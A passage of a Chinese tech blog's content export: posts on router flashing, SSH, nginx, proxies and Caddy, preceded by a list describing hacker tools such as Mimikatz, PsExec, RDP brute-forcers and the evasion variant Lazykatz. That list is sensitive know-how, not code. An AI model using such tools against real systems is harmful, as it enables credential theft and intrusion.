类似，是一款针对高级用户的安全分析工具，它可以帮助研究人员检测和解决软件或进程在特定操作系统环境下遇到的问题。除此之外，它还可以检测恶意进程，并告知我们这些恶意进程想要实现的功能。Process Hacker是一个开源项目，Process Hacker跟ProcessExplorer十分相似，但是Process Hacker提供了更多的功能以及选项。而且由于它是完全开源的，所以我们还可以根据自己的需要来自定义其他功能。就是这样一款工具，安全人员和黑客，均可以拿来使用，至于是用来应急响应和查杀病毒，还是用来破坏系统或应用，就取决于使用者。 Mimikatz windows密码抓取神器Mimikatz是法国人Genti Kiwi编写的一款windows平台下的工具，它开发了很多功能，最令人熟知的功能是直接从lsass.exe进程里获取Windows处于激活状态账号的明文密码。也正是因为此功能，常常被黑客所使用，用于提取被入侵主机更多的账号密码。 PsExec PsExec 是一个轻型的 telnet 替代工具，它使你无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。这是一款微软官方网站可以下载的工具，有数字签名，属于“根正苗红”类型的，很少有杀毒软件会将这个软件当作病毒的，因为本身它也有正常的用途的。不过，或许正是因为此（杀软不敢“动它”），黑客在攻击中，也时常会使用这个工具，进行远程病毒执行和内网扩散。 DUBrute DUBrute是一款强大的远程桌面(3389)密码破解软件，你可以用本附件的扫描功能来自动扫描活跃IP地址，扫描完成后设置好用户名与需要猜解的密码就可以开始全自动工作了。 NLBrute 一款爆破工具，跟DUBrute比较类似，不同黑产团队可能使用不同的爆破工具，或者基于某种考虑，会轮换使用相同类型的不同工具。 WebBrowserPassView WebBrowserPassView是一款功能强大的网页密码查看工具。该款工具会自动找出你在浏览器里面保存过的的帐号和对应的密码并显示出来，只要启动它，经过几秒钟之后，就会看到画面上出现你的浏览器所记忆的网址、帐号及密码了！目前一共支持了IE1~IE9、Firefox、Chrome及Opera等四种主流浏览器。 PortScan &amp; Stuff PortScan &amp; Stuff 是一款端口扫描工具，可以快速检查IP范围并返回有关运行中的计算机的信息。如果您希望检查网络计算机的详细信息，它特别有用，PortScan并不是一个很复杂的程序，尽管它或多或少显然没有针对初学者。其简洁的界面依赖于选项卡式布局，因此您只需单击即可轻松访问所需的功能。它扫描所有可用的端口，并显示每台连接的计算机的详细信息，例如MAC地址，主机名，打开的端口和HTTP服务器。 此外，您还可以启动ping会话并ping IP地址或主机名，并可以使用以下三种模式：3个短ping，大ping套件和连续清管。该应用程序结合了具有基本选项的速度测试工具，从而帮助您确定网络连接的下载和上传速度。您不需要Windows 7计算机上的管理员特权，但是必须在防火墙中授予对网络的访问权限。 Lazykatz Mimikatz作为一款神器，已广为人知，杀毒软件已将此软件视为“病毒”和“黑客工具”。为了逃避检测和加强绕过，Lazykatz是Mimikatz的升级版本，最新版本是 lazykatz v4.0。 PowerTool PowerTool 一款免费强大的进程管理器，支持进程强制结束，可以解锁占用文件的进程，查看文件/文件夹被占用的情况，内核模块和驱动的查看和管理，进程模块的内存的dump等功能。最新版还支持上传文件在线扫描病毒。支持离线的启动项和服务的检测和删除，新增注册表和服务的强删功能，可在PE系统下清除感染MBR的病毒（如鬼影等）。 Masscan 号称世界上最快的端口扫描神器 Masscan，根据其作者robert graham，该工具可以在不到6分钟内完成，每秒大约1000万个数据包的扫描，速度非常惊人。端口是网络通讯的入口，端口扫描是入侵的第一步。高效的端口扫描工具，可以起到事半功倍的效果。 Rdp_Connector RDP连接工具，在网络攻击活动中，RDP弱密码作为一个很严重的问题，经常会被利用。 Netpass Network Password Recovery（网络密码查看器）是一款功能强大的系统管理员密码密码找回软件，如果忘记了电脑系统管理员密码时，通过这款软件既可以帮助你轻松找回，让你能够继续使用电脑。 Gmer Gmer是一款来自波兰的多功能安全监控分析应用软件。它能查看隐藏的进程服务，驱动， 还能检查Rootkit，启动项，并且具有内置命令行和注册表编辑器 ，Gmer具有强大监控功能。Gmer还具备自己系统安全模式，清理顽固木马病毒很得心应手！ 参考 ProcessExplorer-ProcessMonitor-系统监控必备工具 推荐我常用的几款安全软件 PeDoll 开源及使用教程","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Linux环境下npm和node版本升级方法","slug":"npm-node-update-self-in-linux","date":"2020-01-01T03:57:22.000Z","updated":"2020-01-01T03:57:22.000Z","comments":true,"path":"npm-node-update-self-in-linux.html","permalink":"https://sobaigu.com/npm-node-update-self-in-linux.html","excerpt":"有些Linux系统默认带的node版本都比较老，在运行一些新时代程序时可能会出现错误，比如在 = 附近的语法错误之类的，此时可以考虑下node版本是不是太古老了，使用以下命令升级：","text":"有些Linux系统默认带的node版本都比较老，在运行一些新时代程序时可能会出现错误，比如在 = 附近的语法错误之类的，此时可以考虑下node版本是不是太古老了，使用以下命令升级： 123456789# 先安装模块nnpm install n -g# 将 node 升级到最新稳定版n stable# 将 npm 升级到最新版npm install npm -g# 如果要指定版本，可以通过@指定版本，降级升级都可以用此命令# npm install npm@6.10.10 -g 升级完成后，退出重新登录或者干脆重启操作系统就可以了，用 npm version 可查看版本是否已更新。 没想到2020遇到的第一个问题是node版本过旧，程序启动不了 o(╯□╰)o 更多 npm 升级操作可参考：Hexo 及 NPM 依赖插件升级操作","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"macOS系统设置Teamviewer权限，解决无法远程受控问题","slug":"software-teamviewer-set-access-right-in-macos","date":"2019-11-26T10:12:56.000Z","updated":"2019-11-26T10:12:56.000Z","comments":true,"path":"software-teamviewer-set-access-right-in-macos.html","permalink":"https://sobaigu.com/software-teamviewer-set-access-right-in-macos.html","excerpt":"","text":"前言 苹果已经在macOS 10.14（Mojave）中引入了一种安全机制，该机制要求授予对TeamViewer等远程控制应用程序的特殊访问权限。 macOS 10.15（Catalina）确实进一步增强了安全性和隐私性，并且需要授予TeamViewer其他权限来远程控制Mac。 如果没有此访问权限，连接到运行macOS10.14或更高版本的Mac的TeamViewer用户将只能查看屏幕，而不能用鼠标或键盘控制屏幕。 连接到运行macOS10.15或更高版本的Mac的TeamViewer用户将只能查看桌面背景和TeamViewer应用程序，而看不到其他应用程序，也无法使用鼠标或键盘对其进行控制。 解决方法 一个正常的远程控制，需要授予以下权限： 授权项 说明 屏幕录像 TeamViewer需要“屏幕录制”访问权限，以便远程用户可以在“远程控制会话和会议”中查看您的屏幕 辅助功能 TeamViewer要求具有辅助功能访问权限，以便可以远程控制鼠标和键盘 全盘访问 TeamViewer需要完全磁盘访问权限才能访问Mac上的文件和文件夹以进行文件传输（通常是发送和接收文件） 注意：TeamViewer无法自行授予此访问权限，也无法通过另一台计算机的TeamViewer连接远程授予访问权限。 此访问权限必须在MacOS上本地授予，并且需要管理员权限才能授予它。所以需要本地用户进行操作，请在下面找到有关Mojave和Catalina的设置的不同方法指南。 macOS Mojave(10.14)设置指南 如何在Mac上授予对TeamViewer的访问权限 如果您在Mac上使用 TeamViewer 14 ，则在启动TeamViewer时将显示： 在上面显示的对话框中，单击 配置权限 按钮，该按钮将显示此 辅助功能访问 对话框： 单击 打开系统首选项 按钮。您将进入 安全和隐私 首选项中的 隐私 窗格的 辅助功能 部分。 单击 左下角的锁定图标 变成 开锁状态 以进行更改。系统将会提示 输入管理员帐户的凭据密码 以继续。在TeamViewer旁边 勾选 以授予其访问权限： 现在，您可以关闭 安全和隐私 窗口。重启TeamViewer接收传入连接时，连接到Mac的人现在可以使用鼠标和键盘控制它。 如果没有出现对话框，如何授予访问权限 如果您使用的是较旧版本的TeamViewer，并且未向您提供“辅助功能访问”对话框，要求您授予对TeamViewer的访问权限 - 或者您之前单击了该对话框上的“拒绝”按钮 - 它仍然可以授予访问TeamViewer。 此外，在某些情况下，在将TeamViewer安装到Mac上之后，您可以在第一次与计算机建立TeamViewer连接之前立即授予对TeamViewer的访问权限。请注意，TeamViewer Host无法做到这一点。 相关步骤如下： 1.打开 系统偏好设置》安全和隐私》隐私》辅助功能 2.单击 锁定图标 变成 开锁状态 3.如果TeamViewer已显示在窗格中，则 勾选 它旁边的复选框以启用它。 4.如果没有，请单击窗格下方 + 号小按钮，这将打开Finder窗口： 5.导航到应用文件夹，选择 TeamViewer ，然后单击 Open 6.现在，您应该在窗格中列出并启用TeamViewer 如何在使用随系统启动TeamViewer时授予访问权限 如果启用TeamViewer的选项中的随系统启动 TeamViewer （设置） ，则TeamViewer将使用名为TeamViewer_Desktop 的其他进程重新启动。 执行此操作后，第一次与Mac建立连接时，将再次显示 辅助功能访问 对话框，但这次是指新进程。您需要再次通过单击 打开系统首选项 按钮并按照上述相同步骤授予访问权限。 macOS Catalina(10.15)设置指南 如何在Mac上授予对TeamViewer的访问权限 如果您是首次在运行macOS 10.15（Catalina）的Mac上启动 TeamViewer 14.7 ，则系统将提示您以下弹出窗口： 您也可以通过单击 帮助》检查系统访问权限 来打开此对话框。 默认情况下，所有权限都设置为 拒绝 。请手动授予系统功能以使用TeamViewer。 要允许访问，请单击弹出窗口中显示的按钮（例如，打开完整磁盘访问首选项…），这将带您进入 安全性 和 隐私 首选项内 隐私 窗格的 全磁盘访问 部分。 单击左下角的锁图标进行更改,系统将提示您输入管理员帐户的凭据以继续。勾选 TeamViewer旁边的复选框以授予其访问权限: 同上方法，对 屏幕录制 和 可访问性 重复相同的步骤，这些是远程控制Mac所必需的。 现在，您可以关闭 安全和隐私 窗口，下次您想与TeamViewer进行传入连接时，连接到Mac的人将能够查看和控制您的屏幕。 可以随时在 帮助》检查系统访问权限 下查看权限状态。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"WordPress设置固定链接后出现404错误","slug":"wordpress-rewrite-404-file-not-found-with-permalink","date":"2019-11-07T07:50:48.000Z","updated":"2019-11-07T07:50:48.000Z","comments":true,"path":"wordpress-rewrite-404-file-not-found-with-permalink.html","permalink":"https://sobaigu.com/wordpress-rewrite-404-file-not-found-with-permalink.html","excerpt":"","text":"前言 很久没折腾WordPress了，搭了个居然出现404错误，宝塔面板一键静态设置居然还不行，无奈还是手动改nginx伪静态设置，记录之防以后再用到。 解决 偷懒用的宝塔面板，一键搭建网站环境，一键设置伪静态是这样的： 123location / &#123; try_files $uri $uri/ /index.php?$args;&#125; 但因为特殊的网站结构，常见的伪静态不适用了，需要如下设置： 12345678910111213location / &#123; index index.html index.php; if (-f $request_filename/index.html)&#123; rewrite (.*) $1/index.html break; &#125; if (-f $request_filename/index.php)&#123; rewrite (.*) $1/index.php; &#125; if (!-f $request_filename)&#123; rewrite (.*) /index.php; &#125; rewrite /wp-admin$ $scheme://$host$uri/ permanent;&#125; 如果网站是放在二级目录访问的，如 http://sobaigu.com/wordpress ，那么上面涉及到的路径需添加 /wordpress 路径： 12345678910111213location /wordpress/ &#123; index index.html index.php; if (-f $request_filename/index.html)&#123; rewrite (.*) $1/index.html break; &#125; if (-f $request_filename/index.php)&#123; rewrite (.*) $1/index.php; &#125; if (!-f $request_filename)&#123; rewrite (.*) /wordpress/index.php; &#125; rewrite /wp-admin$ $scheme://$host$uri/ permanent;&#125; 参考文档 WordPress-伪静态固定链接404的解决办法方案","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Linux系统下ShadowSocksR客户端使用说明","slug":"software-shadowsocksr-in-linux","date":"2019-11-05T02:42:14.000Z","updated":"2019-11-05T02:42:14.000Z","comments":true,"path":"software-shadowsocksr-in-linux.html","permalink":"https://sobaigu.com/software-shadowsocksr-in-linux.html","excerpt":"","text":"相比于Windows系统丰富的客户端，Linux系统GUI客户端相对匮乏，而且功能相对来说比较弱。有些客户端启动后，还需要对系统进行额外设置，或者浏览器中安装扩展等来实现自动代理等。 以下是以Linux常见发行版ubuntu为例，其他发行版大同小异。 客户端选择 前文说过，客户端匮乏，所以这里推荐：electron-ssr项目 ，客户端到此下载，挑自己系统的版本，如ubuntu则是 .deb 文件。 该项目经 electron 打包，实现跨平台，各平台都有客户端，但Windows，macOS优秀的太多，这个就安心在Linux上用吧。 安装 ubuntu下载 .deb 包，然后在终端执行： 1234#先安装依赖sudo apt install libcanberra-gtk-module libcanberra-gtk3-module gconf2 gconf-service libappindicator1#安装刚下载的deb安装包sudo dpkg -i electron-ssr-0.2.6.deb 使用 完成后打开该软件，如果你有订阅地址的话就可以很方便的添加服务器信息了，功能都在界面上，直接复制订阅地址然后更新就行了： 剩下的就和 Windows 版的一样了，系统代理模式、更新 PAC、添加服务器、扫描二维码和开机自启等都有： 如果软件设置不能实现代理，那么尝试在启动器中找到 系统设置-网络设置-网络代理 设置为如下图所示： 终端模式 如果想要在终端中使用代理，那么在配置中选中 http 代理： 然后在终端中执行下面命令即可，其中的端口就是上图中的端口： 1export http_proxy=&quot;http://127.0.0.1:12333&quot; 然后可以使用 curl www.google.com 来测试是否成功使用代理。 辅助参考 官方教程说明文档","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"MobaXterm - 全能的远程管理工具","slug":"software-remotetool-mobaxterm","date":"2019-10-25T07:29:38.000Z","updated":"2019-10-25T07:29:38.000Z","comments":true,"path":"software-remotetool-mobaxterm.html","permalink":"https://sobaigu.com/software-remotetool-mobaxterm.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文 文件大小：25m 支持系统：Windows/ 官方主页： 软件介绍 MobaXterm是一款功能强大的远程监控软件，用户可以通过软件创建SSH，RDP，VNC，XDMCP，FTP，SFTP等终端，堪称一款豪华、全功能的终端软件。而且MobaXterm启动时自建SFTP服务，直接就可以在SSH远程控制终端上进行上传下载文件操作。 软件特色： 直接的便携版 内建多标签和多终端分屏 内建SFTP文件传输 内建X server，可远程运行X窗口程序 直接支持VNC/RDP/Xdmcp等远程桌面 默认的UTF-8编码 更加友好的串口连接设置 操作更明确，更少的 神秘技巧 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 8b8f","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"小米路由器mini刷openwrt系统","slug":"xiaomi-router-mini-run-with-openwrt","date":"2019-10-15T14:02:05.000Z","updated":"2019-10-15T14:02:05.000Z","comments":true,"path":"xiaomi-router-mini-run-with-openwrt.html","permalink":"https://sobaigu.com/xiaomi-router-mini-run-with-openwrt.html","excerpt":"","text":"前言 买了个打印机 HP DeskJet 2132 ，只支持USB打印，可老插在笔记本电脑上有点不妥，将闲置的小米路由器mini搬出来，老物新用。 这个路由器有16M的ROM，还能装点东西，比斐讯K2还是好使得多，可以刷功能较齐备的openwrt，顺便搞个去广告，科学上网等，当然，本次最主要的是利用小米路由器mini的USB口连接打印机，让初级打印机支持网络打印。 刷机步骤 刷开发版，获取SSH权限 小米路由器要刷其他系统，需要先获得SSH权限，而获得SSH权限则需要先刷开发版，本身没什么好说的，相关详细教程请参考此处：小米路由刷开发版系统 刷Breed 辛辛苦苦把SSH权限搞定后，那我们当然是希望不再受小米的桎梏，所以要做的是换个BootLoder系统，大名鼎鼎的Breed（Boot and Recovery Environment for Embedded Devices）便是不二选择。 要刷入Breed也不复杂，操作步骤如下： 1.下载Breed固件 在Breed固件列表，查找自己设备所需的版本，小米路由器mini需要的是这个：breed-mt7620-xiaomi-mini.bin 2.备份原有的BootLoder 使用SSH客户端连接登录路由系统，输入以下命令： 1dd if=/dev/mtd1 of=/tmp/xiaomi_uboot.bin 系统返回，说明已经将原来的xiaomi_uboot.bin备份到/tmp： 12384+0 records in384+0 records out 备份完成后将备份文件下载到本地妥善保存，用不到就最好了。不知道怎么下载？那就扔了不要了吧，就当这步备份操作白做了，反正出了问题自己负责o(￣︶￣)o 3.刷Breed 用sftp之类工具把Breed固件上传到 /tmp 目录下，如果不会传那也可以ssh登录路由系统后执行下面的命令直接从网上下载： 12cd /tmpwget http://down.sobaigu.com/files/breed-mt7620-xiaomi-mini.bin 然后执行以下写入命令： 1mtd -r write /tmp/breed-mt7620-xiaomi-mini.bin Bootloader 眨眼的功夫就刷写完成了，完成后关闭路由拔掉电源，找取卡针之类的尖物件抵住 reset 按钮，插上电源开机，等到路由指示灯狂闪的时候，就可以松开 reset 键，然后在用网线连接在该路由上的电脑上打开浏览器登录 192.168.1.1 就可以进入 Breed web恢复控制台 界面了，就如上面那个截图。 刷固件 在刷固件前，建议使用Breed固件备份功能，将原路由所有的项目备份好以备用，同样的用不到最好。 因为路由有16M的ROM，所以可选的固件还是蛮多的，潘朵拉，华硕改等固件都行，在此推荐一个，个人觉着还蛮不错的，功能也齐全：小米路由器Mini Lean R9.7.6 自编译固件，本人喜欢的是这个带V2的版本: 12345大小： 15, 729, 346 字节修改时间： 2019-07-18 11:49:41MD5： 843779CA73BAE57A26402D52C4C5198FSHA1： 3C6DF0E8B6C5B2AA6F0A888445C46BE788FED21ECRC32： 4ACC516F 选择 固件更新 》点击 固件 右侧的 选择文件 ，选择刚下载的固件文件，然后点上传，不一会儿就完成了，新系统默认后台信息为： 123IP： 192.168.1.1用户： root密码： password 至此，路由器系统脱胎换骨完成，有广告屏蔽，有科学上网还支持订阅地址，V2Ray，支持局域网网络唤醒设备，提供打印机服务…… 有点小瑕疵，可能有内存泄露开久了会死机，带宽监控统计图表不展示之类的，设置下每周定时重启，完全OK，知足常乐！ 用到的工具 本文提到的SSH客户端市面上有不少，finalshell，secureCRT，putty，winscp等都可以，根据个人喜好推荐以下两款： 全能的远程管理工具：MobaXterm Xshell-Windows平台上优秀的 SSH 客户端","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"蜗牛星际矿渣B双不识别外接移动硬盘","slug":"woniu-nas-with-usbdisk-on-style-b","date":"2019-10-13T11:27:40.000Z","updated":"2019-10-13T11:27:40.000Z","comments":true,"path":"woniu-nas-with-usbdisk-on-style-b.html","permalink":"https://sobaigu.com/woniu-nas-with-usbdisk-on-style-b.html","excerpt":"搞了几个蜗牛矿难机，凑了几T硬盘，组了个黑裙，还没咋折腾，闲置了好长一段时间。想用的时候，想把一些资料转移到传说中的NAS，结果发现插上USB线却认不到盘。","text":"搞了几个蜗牛矿难机，凑了几T硬盘，组了个黑裙，还没咋折腾，闲置了好长一段时间。想用的时候，想把一些资料转移到传说中的NAS，结果发现插上USB线却认不到盘。 现象 外接移动硬盘无法识别，看不到移动硬盘存储空间，控制面板中无外接设备，但进入Linux系统可见该设备已经识别。以为是硬盘格式为Windows的NTFS导致的，可怎么都不能mount该设备，甚至外接个U盘都一样的无法识别。 解决 一句话：将BIOS中的系统类型选为 Windows 8.x ，方法不赘述，自行在BIOS中找到该设置：Advanced》Miscellaneous Configuration》OS Selection》Windows 8.x ，按 f10 保存即可。 话说，这个B款版本为啥没有 Android 或 Linux 这个系统类型可选？ 副作用 BIOS中系统类型选为 Windows 8.x 后，在黑裙后台网页上点 关机 不是关机，变成了重启，需要在机器上插一个USB设备才能正常关机。 据说这个问题只在6.21的黑群晖系统上有，其他版本都正常，没有具体去试，有兴趣的可自行去降级升级测试，或者接完移动设备后改回原先的系统类型。 参考 918+6.2.1二合一引导，不插USB设备就无法关机，求解~","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"GitHub认证SSH无权限问题","slug":"git-authentication-with-ssh-for-github","date":"2019-10-13T03:28:47.000Z","updated":"2019-10-13T03:28:47.000Z","comments":true,"path":"git-authentication-with-ssh-for-github.html","permalink":"https://sobaigu.com/git-authentication-with-ssh-for-github.html","excerpt":"","text":"前言 GitHub仓库，用着用着就会出现推送和拉取失败，提示认证失败，上一次出现是半个月前，啥都没改过，有必要记录一下。 可能原因 根据日志提示，很确定的是无权限被GitHub给拒绝了，至于原因可能有： 账号未登录：这个原因很明显不成立，公开的仓库本来就不需要登录GitHub账号 token过期：这个有可能，退出重新登录尝试 没权限访问该仓库：如果是某些私有仓库，未登录自己的账号则会被拒绝，此处也不是这个原因 仓库被存档：如果仓库是存档或删除状态，此时去操作是会失败的，自行确认 SSH认证失败：这个是常见原因 现象 同时在coding和GitHub使用的同一个秘钥对，但就是GitHub仓库无法认证，GitHub explorer程序日志提示如下： 1234567891011121314151617181920212223(The error was parsed as 2: Authentication failed. Some common reasons include:- You are not logged in to your account: see File &gt; Options.- You may need to log out and log back in to refresh your token.- You do not have permission to access this repository.- The repository is archived on GitHub. Check the repository settings to confirm you are still permitted to push commits.- If you use SSH authentication, check that your key is added to the ssh-agent and associated with your account.)2019-10-12T14:24:58.619Z - info: [ui] Current tutorial step is NotApplicable2019-10-12T14:25:00.202Z - info: [ui] Current tutorial step is NotApplicable2019-10-12T14:25:00.203Z - info: [ui] Background fetch for 16 repositories took 34.089sec2019-10-12T14:29:18.575Z - info: [ui] Current tutorial step is NotApplicable2019-10-12T14:29:23.113Z - info: [ui] Executing fetch: git -c credential.helper= fetch --progress --prune origin (took 1.658s)2019-10-12T14:29:24.144Z - info: [ui] Current tutorial step is NotApplicable2019-10-12T14:29:30.855Z - info: [ui] [BranchPruner] Last prune took place in a day - skipping2019-10-12T14:29:31.834Z - info: [ui] Current tutorial step is NotApplicable2019-10-12T14:29:33.558Z - info: [ui] Executing fetch: git -c credential.helper= -c protocol.version=2 fetch --progress --prune origin (took 2.515s)2019-10-12T14:29:33.558Z - error: [ui] `git -c credential.helper= -c protocol.version=2 fetch --progress --prune origin` exited with an unexpected code: 128.stderr:Host key verification failed.fatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists. 解决方案 针对以上可能的原因，我们需要逐个去检查确认，然后测试结果。一些常见账号操作没什么好说的，直接跳到重点部分。 重新配置SSH密钥 有时候系统环境变化，可能会出现本地SSH私钥丢失等情况，那么我们可以重新配置一遍，本地重新生成秘钥对或者GitHub上删除重新添加公钥。重新生成秘钥对方法如下： 打开 gitbash 程序，运行如下命令 1234git config --global user.email &#x27;youremail@example.com&#x27; #设置Git邮箱git config --global user.name &#x27;yourusername&#x27; #设置Git用户名ssh-keygen -t rsa -C &#x27;youremail@example.com&#x27;#上面的命令一般一路默认就可以了，`.pub`是公钥，把私钥和公钥自己妥善保管 设置Git邮箱和用户名这个如果没提示不操作也可以，或者在客户端设置中设置即可，都是一样的。生成的公钥用记事本打开，全部复制里面的内容添加到GitHub账号的 SSH keys 设置中。 删除 known_hosts 中已有GitHub地址 这个文件在系统用户目录下，是个系统保护目录，Windows路径为： 1C:\\Users\\用户名\\.ssh\\known_hosts #这里是win10路径，其他版本大同小异 找到后用记事本打开，将GitHub相关地址整行删除掉，保存即可。下次重新连接时会提示是否添加，输入 yes 即可。 测试SSH 配置完 SSH keys 后，我们可以对结果进行测试，有时候这一步客户端软件还不灵，在bash中测试一把还能解决某些问题。测试命令如下： 1ssh -Tv &#x27;vps上的git用户名@vps地址&#x27; -p &#x27;ssh端口&#x27; #测试ssh连接是否成功 测试GitHub的连通性则命令是这样的： 1ssh -Tv git@github.com 不出意外的话会输出一坨信息： 12345678910111213141516171819202122232425262728293031323334353637383940PS D:\\Git\\Shell&gt; ssh -Tv git@github.comOpenSSH_for_Windows_7.7p1, LibreSSL 2.6.5debug1: Connecting to github.com [13.250.177.223] port 22.debug1: Connection established.debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_rsa type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_rsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_dsa type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_dsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_ecdsa type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_ecdsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_ed25519 type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_ed25519-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_xmss type -1debug1: key_load_public: No such file or directorydebug1: identity file C:\\\\Users\\\\zgw50/.ssh/id_xmss-cert type -1debug1: Local version string SSH-2.0-OpenSSH_for_Windows_7.7debug1: Remote protocol version 2.0, remote software version babeld-003ebee6debug1: no match: babeld-003ebee6debug1: Authenticating to github.com:22 as &#x27;git&#x27;debug1: SSH2_MSG_KEXINIT sentdebug1: SSH2_MSG_KEXINIT receiveddebug1: kex: algorithm: curve25519-sha256debug1: kex: host key algorithm: rsa-sha2-512debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: nonedebug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: nonedebug1: expecting SSH2_MSG_KEX_ECDH_REPLYdebug1: Server host key: ssh-rsa SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8debug1: read_passphrase: can&#x27;t open /dev/tty: No such file or directoryThe authenticity of host &#x27;github.com (13.250.177.223)&#x27; can&#x27;t be established.RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.Are you sure you want to continue connecting (yes/no)? 如果提示是否添加指纹，输入 yes： 12RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.Are you sure you want to continue connecting (yes/no)? yes 最后提示成功认证，就表示可以正常操作了： 1Hi sobaigu.com! You&#x27;ve successfully authenticated, but GitHub does not provide shell access. 参考文档 git用户设置 SSH密钥生成与部署","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"Caddy自动申请CA证书失败解决办法","slug":"caddy-acme-ca-failed","date":"2019-10-12T13:41:50.000Z","updated":"2019-10-12T13:41:50.000Z","comments":true,"path":"caddy-acme-ca-failed.html","permalink":"https://sobaigu.com/caddy-acme-ca-failed.html","excerpt":"","text":"现象 Caddy作为一个简单轻便的网站服务端环境，本来用的好好的，突然有一天发现 443 和 80 端口不在了，网站无法访问，反向代理功能不正常……查看caddy日志有如下提示： 1too many registrations for this IP 或者伴随这样的提示： 123456789101112131415161718caddy.service - Caddy HTTP/2 web server Loaded: loaded (/usr/lib/systemd/system/caddy.service; enabled; vendor preset: disabled) Active: failed (Result: exit-code) since Sat 2019-10-12 06:30:22 CST; 4h 10min ago Docs: https://caddyserver.com/docs Process: 758 ExecStart=/usr/local/bin/caddy -log stdout -agree=true -conf=/etc/caddy/Caddyfile -root=/var/tmp (code=exited, status=1/FAILURE) Main PID: 758 (code=exited, status=1/FAILURE)Oct 12 06:30:11 caddy[758]: 2019/10/12 06:30:11 [INFO] [x.y.com] AuthURL: https://acme-v02.api.letsencrypt.org/acme/authz-v3/736450281Oct 12 06:30:11 caddy[758]: 2019/10/12 06:30:11 [INFO] [x.y.com] acme: use tls-alpn-01 solverOct 12 06:30:11 caddy[758]: 2019/10/12 06:30:11 [INFO] [x.y.com] acme: Trying to solve TLS-ALPN-01Oct 12 06:30:11 caddy[758]: 2019/10/12 06:30:11 [INFO] Unable to deactivated authorizations: https://acme-v02.api.letsencrypt.org/acme/authz-v3/736450281Oct 12 06:30:11 caddy[758]: 2019/10/12 06:30:11 [ERROR] Renewing [x.y.com]: acme: Error -&gt; One or more domains had a problem:Oct 12 06:30:11 caddy[758]: [x.y.com] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: Cannot negotiate ALPN protocol &quot;acme-tls/1&quot; for tls-alpn-01 challenge, url:Oct 12 06:30:11 caddy[758]: ; trying again in 10sOct 12 06:30:22 systemd[1]: caddy.service: main process exited, code=exited, status=1/FAILUREOct 12 06:30:22 systemd[1]: Unit caddy.service entered failed state.Oct 12 06:30:22 systemd[1]: caddy.service failed. 可能原因 